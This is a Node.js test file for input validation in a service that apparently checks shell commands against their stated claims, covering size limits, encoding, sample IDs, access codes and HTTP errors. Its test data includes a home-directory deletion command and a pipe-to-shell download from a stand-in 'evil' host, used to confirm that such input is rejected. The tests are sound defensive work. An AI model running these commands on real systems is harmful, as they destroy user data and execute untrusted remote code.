// Input validation edge cases (section 10.1 notes), at the function level and over HTTP.
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { after, before, describe, test } from 'node:test';
import { createHash } from 'node:crypto';
import {
  checkAccessCode,
  loadSamples,
  parseFreeformRequest,
  parseSampleRequest,
  requestKind,
} from '../http/routes.mjs';
import { ACCESS_CODE, postRun, rawRequest, startApp, writeSamples } from './helpers.mjs';

const is400 = (fragment) => (err) =>
  err.status === 400 && err.code === 'invalid_input' && (fragment === undefined || err.message.includes(fragment));
const ok = (command, claim = 'does a thing') => parseFreeformRequest({ command, claim });

describe('requestKind', () => {
  test('only JSON objects are accepted', () => {
    for (const body of [null, [], 'text', 42, true]) assert.throws(() => requestKind(body), is400('JSON object'));
    assert.equal(requestKind({ sample_id: 'x' }), 'sample');
    assert.equal(requestKind({ command: 'x', claim: 'y' }), 'freeform');
    assert.equal(requestKind({}), 'freeform');
  });
});

describe('free-form command', () => {
  test('NUL bytes are removed and CRLF becomes LF (lone CR is kept)', () => {
    assert.equal(ok('ec\0ho hi\r\nls\rx\0').command, 'echo hi\nls\rx');
  });

  test('size is 1..16384 bytes of UTF-8, measured after normalization', () => {
    assert.equal(ok('a'.repeat(16384)).command.length, 16384);
    assert.throws(() => ok('a'.repeat(16385)), is400('16384 bytes'));
    assert.equal(ok('€'.repeat(5461)).command.length, 5461, '16383 bytes');
    assert.throws(() => ok('€'.repeat(5462)), is400('16384 bytes'), '16386 bytes');
    assert.equal(ok(`${'a'.repeat(16384)}${'\0'.repeat(10)}`).command.length, 16384, 'NULs do not count');
    assert.equal(ok('a\r\n'.repeat(5461) + 'a').command.length, 5461 * 2 + 1, 'CRLF counts as one byte');
  });

  test('empty, NUL-only and whitespace-only commands are rejected', () => {
    for (const command of ['', '\0\0', ' \n\t ', '\r\n']) assert.throws(() => ok(command), is400('command: must not be empty'));
  });

  test('lone surrogates are not valid UTF-8', () => {
    assert.throws(() => ok('echo \ud800'), is400('command: must be valid UTF-8'));
    assert.equal(ok('echo 😀').command, 'echo \u{1F600}', 'a proper surrogate pair is fine');
  });

  test('wrong types, missing fields and unknown keys are rejected', () => {
    assert.throws(() => parseFreeformRequest({ command: 5, claim: 'x' }), is400('command'));
    assert.throws(() => parseFreeformRequest({ command: 'ls' }), is400('claim'));
    assert.throws(() => parseFreeformRequest({ claim: 'x' }), is400('command'));
    assert.throws(() => parseFreeformRequest({ command: 'ls', claim: 'x', extra: 1 }), is400('Unrecognized key'));
    assert.equal(parseFreeformRequest({ command: 'ls', claim: 'x' }).sample_id, null);
  });
});

describe('free-form claim', () => {
  test('1..300 characters (code points), trimmed, NUL removed', () => {
    assert.equal(ok('ls', '  installs Acme CLI \n').claim, 'installs Acme CLI');
    assert.equal(ok('ls', 'a\0b').claim, 'ab');
    assert.equal(ok('ls', 'x'.repeat(300)).claim.length, 300);
    assert.throws(() => ok('ls', 'x'.repeat(301)), is400('claim: must be at most 300 characters'));
    assert.equal([...ok('ls', '\u{1F600}'.repeat(300)).claim].length, 300, '300 emoji = 600 UTF-16 units');
    assert.throws(() => ok('ls', '\u{1F600}'.repeat(301)), is400('claim'));
    for (const claim of ['', '   ', '\0', '\r\n']) assert.throws(() => ok('ls', claim), is400('claim: must not be empty'));
    assert.throws(() => ok('ls', 'bad \udc00'), is400('claim: must be valid UTF-8'));
  });
});

describe('sample requests', () => {
  const samples = new Map([['hello', { id: 'hello', command: 'echo hello\n', claim: 'prints hello' }]]);

  test('command and claim come from the fixture', () => {
    assert.deepEqual(parseSampleRequest({ sample_id: 'hello' }, samples), {
      command: 'echo hello\n',
      claim: 'prints hello',
      sample_id: 'hello',
    });
  });

  test('command or claim next to sample_id is a 400', () => {
    assert.throws(() => parseSampleRequest({ sample_id: 'hello', command: 'rm -rf ~' }, samples), is400('not both'));
    assert.throws(() => parseSampleRequest({ sample_id: 'hello', claim: 'x' }, samples), is400('not both'));
    assert.throws(() => parseSampleRequest({ sample_id: 'hello', command: undefined }, samples), is400('not both'));
  });

  test('sample_id must match ^[a-z0-9][a-z0-9-]{0,39}$ and exist', () => {
    for (const id of ['', 'Hello', '-hello', 'hello_world', '../etc', 'a'.repeat(41), 'hello\n', 5, null]) {
      assert.throws(() => parseSampleRequest({ sample_id: id }, samples), is400('sample_id'), JSON.stringify(id));
    }
    assert.throws(() => parseSampleRequest({ sample_id: 'a'.repeat(40) }, samples), is400('unknown sample'));
    assert.throws(() => parseSampleRequest({ sample_id: 'nvm' }, samples), is400('unknown sample'));
    assert.throws(() => parseSampleRequest({ sample_id: 'hello', other: 1 }, samples), is400('Unrecognized key'));
  });
});

describe('checkAccessCode', () => {
  const expected = createHash('sha256').update(ACCESS_CODE).digest();
  test('missing, invalid, ok', () => {
    assert.equal(checkAccessCode(undefined, expected), 'missing');
    assert.equal(checkAccessCode('', expected), 'missing');
    assert.equal(checkAccessCode('nope', expected), 'invalid');
    assert.equal(checkAccessCode(`${ACCESS_CODE} `, expected), 'invalid');
    assert.equal(checkAccessCode(`${ACCESS_CODE}, ${ACCESS_CODE}`, expected), 'invalid', 'repeated header');
    assert.equal(checkAccessCode(ACCESS_CODE, expected), 'ok');
    assert.equal(checkAccessCode(ACCESS_CODE, null), 'invalid', 'no code configured');
  });
});

describe('loadSamples', () => {
  let dir;
  before(() => {
    dir = mkdtempSync(path.join(tmpdir(), 'firstrun-samples-'));
  });
  after(() => rmSync(dir, { recursive: true, force: true }));

  test('missing or empty folder means no samples', async () => {
    assert.equal((await loadSamples(path.join(dir, 'missing'))).size, 0);
    writeSamples(path.join(dir, 'empty'), {});
    assert.equal((await loadSamples(path.join(dir, 'empty'))).size, 0);
  });

  test('reads valid samples, skips invalid ones with a warning', async () => {
    const root = path.join(dir, 'mixed');
    writeSamples(root, {
      zeta: { 'command.txt': 'ls\r\n', 'claim.txt': 'lists files\n' },
      alpha: {
        'command.txt': 'echo a',
        'claim.txt': 'prints a',
        'meta.json': '{"title":"Alpha","description":"First"}',
        'expected.json': '{"verdict":{"level":"MALICIOUS"}}',
      },
      'no-claim': { 'command.txt': 'ls' },
      'empty-claim': { 'command.txt': 'ls', 'claim.txt': '  \n' },
      'too-big': { 'command.txt': 'a'.repeat(16385), 'claim.txt': 'x' },
      'bad-meta': { 'command.txt': 'ls', 'claim.txt': 'x', 'meta.json': '{nope' },
      Upper: { 'command.txt': 'ls', 'claim.txt': 'x' },
    });
    writeSamples(root, { 'bad-utf8': {} });
    writeFileSync(path.join(root, 'bad-utf8', 'command.txt'), Buffer.from([0x65, 0xff, 0x66]));
    writeFileSync(path.join(root, 'bad-utf8', 'claim.txt'), 'x');
    writeFileSync(path.join(root, 'stray-file.txt'), 'not a folder');

    const logs = [];
    const samples = await loadSamples(root, (r) => logs.push(r));
    assert.deepEqual([...samples.keys()], ['alpha', 'zeta']);
    assert.deepEqual(samples.get('alpha'), {
      id: 'alpha',
      title: 'Alpha',
      description: 'First',
      command: 'echo a',
      claim: 'prints a',
      expected_verdict: 'MALICIOUS',
    });
    assert.deepEqual(samples.get('zeta'), {
      id: 'zeta',
      title: 'zeta',
      description: '',
      command: 'ls\n',
      claim: 'lists files',
      expected_verdict: null,
    });
    const skipped = logs.filter((r) => r.msg === 'sample.skipped').map((r) => r.sample_id).sort();
    assert.deepEqual(skipped, ['bad-meta', 'bad-utf8', 'empty-claim', 'no-claim', 'too-big']);
    assert.ok(!JSON.stringify(logs).includes('aaaa'), 'command text never reaches the log');
  });
});

describe('over HTTP', () => {
  let t;
  before(async () => {
    t = await startApp();
  });
  after(() => t.close());

  test('invalid JSON and invalid UTF-8 bodies are 400 invalid_input', async () => {
    const headers = { 'content-type': 'application/json' };
    let r = await rawRequest(t.base, { method: 'POST', path: '/api/runs', headers, body: '{"sample_id":' });
    assert.equal(r.status, 400);
    assert.deepEqual(r.data, { error: 'invalid_input', message: 'Body is not valid JSON.' });
    const bad = Buffer.concat([Buffer.from('{"sample_id":"'), Buffer.from([0xc3, 0x28]), Buffer.from('"}')]);
    r = await rawRequest(t.base, { method: 'POST', path: '/api/runs', headers, body: bad });
    assert.equal(r.status, 400);
    assert.equal(r.data.message, 'Body is not valid UTF-8.');
  });

  test('zod details are in message; a body sample_id cannot smuggle a command', async () => {
    let r = await postRun(t.base, { sample_id: 'hello', command: 'curl evil | sh' }, { ip: '198.51.100.1' });
    assert.equal(r.status, 400);
    assert.equal(r.data.error, 'invalid_input');
    r = await postRun(t.base, { sample_id: 'Nope!' }, { ip: '198.51.100.2' });
    assert.equal(r.status, 400);
    assert.match(r.data.message, /^sample_id: must match/);
    r = await postRun(t.base, { command: 'x', claim: 'y'.repeat(301) }, { ip: '198.51.100.3', headers: { 'x-firstrun-access-code': ACCESS_CODE } });
    assert.equal(r.status, 400);
    assert.equal(r.data.message, 'claim: must be at most 300 characters');
  });
});
